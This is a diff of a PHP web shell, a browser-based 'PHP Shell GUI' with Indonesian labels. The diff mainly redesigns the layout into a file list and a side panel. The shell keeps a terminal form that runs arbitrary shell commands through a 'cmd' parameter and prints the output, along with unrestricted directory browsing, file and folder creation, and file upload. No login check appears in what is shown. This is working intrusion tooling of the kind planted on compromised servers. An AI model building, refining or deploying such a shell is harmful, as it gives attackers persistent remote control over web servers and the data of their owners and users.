@@ -1,5 +1,9 @@
 <?php
-$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+// Path awal saat pertama load (default shell dir)
+$initial_path = realpath(getcwd());
+
+// Ambil path saat ini dari parameter
+$path = isset($_GET['path']) ? realpath($_GET['path']) : $initial_path;
 if (!$path || !is_dir($path)) {
     die("Invalid path.");
 }
@@ -79,28 +83,66 @@ echo <<<HTML
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 PHP Shell GUI with User/Group & Sorted</title>
+<title>🌐 PHP Shell GUI - Panel Kanan Vertikal</title>
 <style>
-    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; margin:0; opacity: 0; transition: opacity 0.5s ease; }
+    body {
+        background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px;
+        opacity: 0; transition: opacity 0.5s ease;
+    }
     body.fade-in { opacity: 1; }
     a { color: #61dafb; text-decoration: none; cursor: pointer; }
     a:hover { text-decoration: underline; }
-    .path, .box { background: #2c2f4a; padding: 10px; border-radius: 8px; margin-bottom: 10px; }
-    input, select { padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px; }
-    input[type=submit], button.mini-btn { background: #333; color: white; cursor: pointer; border: none; padding: 5px 8px; border-radius: 3px; }
-    .del-btn { color: #e74c3c; margin-left: 5px; text-decoration: none; cursor: pointer; }
-    .mini-btn:hover, .del-btn:hover { color: red; }
-    pre { background: #111; color: #0f0; padding: 10px; border-radius: 5px; overflow: auto; max-height: 400px; }
-    .flex-header, .flex-row {
+    .container {
         display: flex;
-        padding: 4px 0;
-        border-bottom: 1px solid #333;
-        align-items: center;
-        font-size: 14px;
+        gap: 20px;
+        min-height: 90vh;
+    }
+    /* Kiri: daftar file/folder */
+    #file-list {
+        flex-grow: 1;
+        background: #2c2f4a;
+        padding: 10px;
+        border-radius: 8px;
+        overflow: auto;
+    }
+    /* Kanan: panel vertikal */
+    #side-panel {
+        width: 380px;
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+    }
+    #side-panel > div {
+        background: #2c2f4a;
+        padding: 10px;
+        border-radius: 8px;
+    }
+    input, select {
+        padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px;
+        font-family: monospace;
+    }
+    input[type=submit], button.mini-btn {
+        background: #333; color: white; cursor: pointer; border: none;
+        padding: 5px 8px; border-radius: 3px;
+        font-family: monospace;
+    }
+    .del-btn {
+        color: #e74c3c; margin-left: 5px; text-decoration: none; cursor: pointer;
+    }
+    .mini-btn:hover, .del-btn:hover {
+        color: red;
+    }
+    pre {
+        background: #111; color: #0f0; padding: 10px; border-radius: 5px;
+        overflow: auto; max-height: 300px;
+        font-family: monospace;
+    }
+    .flex-header, .flex-row {
+        display: flex; padding: 4px 0; border-bottom: 1px solid #333;
+        align-items: center; font-size: 14px;
     }
     .flex-header {
-        font-weight: bold;
-        border-bottom: 2px solid #555;
+        font-weight: bold; border-bottom: 2px solid #555;
     }
     .col-name { min-width: 25%; overflow-wrap: break-word; }
     .col-size { min-width: 8%; text-align: right; }
@@ -110,38 +152,42 @@ echo <<<HTML
     .col-time { min-width: 20%; }
     .col-action { min-width: 20%; }
     form { display: inline; margin: 0; }
+    #back-button {
+        margin-bottom: 10px;
+    }
 </style>
 <script>
     document.addEventListener("DOMContentLoaded", function() {
-        // Fade in on page load
         document.body.classList.add("fade-in");
-
-        // Add fade out effect on links
         document.querySelectorAll('a[href]').forEach(link => {
             const href = link.getAttribute('href');
             if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
                 link.addEventListener('click', function(e) {
                     e.preventDefault();
                     document.body.style.opacity = 0;
-                    setTimeout(function() {
-                        window.location.href = href;
-                    }, 400);
+                    setTimeout(() => window.location.href = href, 400);
                 });
             }
         });
-
-        // Add fade out effect on form submit (do NOT preventDefault!)
         document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', function(e) {
+            form.addEventListener('submit', () => {
                 document.body.style.opacity = 0;
-                // Let form submit normally, no preventDefault
             });
         });
     });
 </script>
 </head>
 <body>
-<h1>🌐 PHP Shell GUI with User/Group & Sorted</h1>
+<h1>🌐 PHP Shell GUI</h1>
+
+<div id="back-button">
+    <a href="?path=<?= urlencode($initial_path) ?>" style="font-weight:bold; color:#6af;">
+        🔙 Kembali ke folder awal shell
+    </a>
+</div>
+
+<div class="container">
+    <div id="file-list">
 HTML;
 
 // Breadcrumb path
@@ -155,7 +201,7 @@ foreach ($parts as $p) {
 }
 echo "</div>";
 
-// Ambil dan urutkan file: folder dulu baru file
+// Urutkan file dan folder
 $files = scandir($path);
 $folders = [];
 $files_only = [];
@@ -232,39 +278,42 @@ if (isset($_GET['view'])) {
     }
 }
 
-// Shell command form
 echo <<<HTML
-<div class='box'>
-<form method="GET">
-    <input type="hidden" name="path" value="{$path}">
-    <input type="text" name="cmd" placeholder="Perintah shell..." style="width:60%;">
-    <input type="submit" value="Run">
-</form>
-</div>
+    </div> <!-- end file-list -->
+
+    <div id="side-panel">
+        <div id="actions">
+            <h3>🆕 Buat & Upload</h3>
+            <form method="POST" style="margin-bottom:5px;">
+                <input type="text" name="new_file" placeholder="nama_file.txt" required>
+                <input type="submit" value="Buat File">
+            </form>
+            <form method="POST" style="margin-bottom:5px;">
+                <input type="text" name="new_folder" placeholder="nama_folder" required>
+                <input type="submit" value="Buat Folder">
+            </form>
+            <form method="POST" enctype="multipart/form-data" style="margin-bottom:5px;">
+                <input type="file" name="upload" required>
+                <input type="submit" value="Upload File">
+            </form>
+        </div>
+        <div id="terminal">
+            <h3>💻 Terminal</h3>
+            <form method="GET">
+                <input type="hidden" name="path" value="{$path}">
+                <input type="text" name="cmd" placeholder="Perintah shell..." style="width:90%;">
+                <input type="submit" value="Run">
+            </form>
 HTML;
 
-// Command output
 if ($output) {
-    echo "<div class='box'><b>💻 Output:</b><pre>" . htmlspecialchars($output) . "</pre></div>";
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
 }
 
-// Create file/folder & upload forms
 echo <<<HTML
-<div class='box'>
-<h3>🆕 Buat & Upload</h3>
-<form method="POST" style="margin-bottom:5px;">
-    <input type="text" name="new_file" placeholder="nama_file.txt" required>
-    <input type="submit" value="Buat File">
-</form>
-<form method="POST" style="margin-bottom:5px;">
-    <input type="text" name="new_folder" placeholder="nama_folder" required>
-    <input type="submit" value="Buat Folder">
-</form>
-<form method="POST" enctype="multipart/form-data" style="margin-bottom:5px;">
-    <input type="file" name="upload" required>
-    <input type="submit" value="Upload File">
-</form>
-</div>
+        </div>
+    </div> <!-- end side-panel -->
+</div> <!-- end container -->
 </body>
 </html>
 HTML;
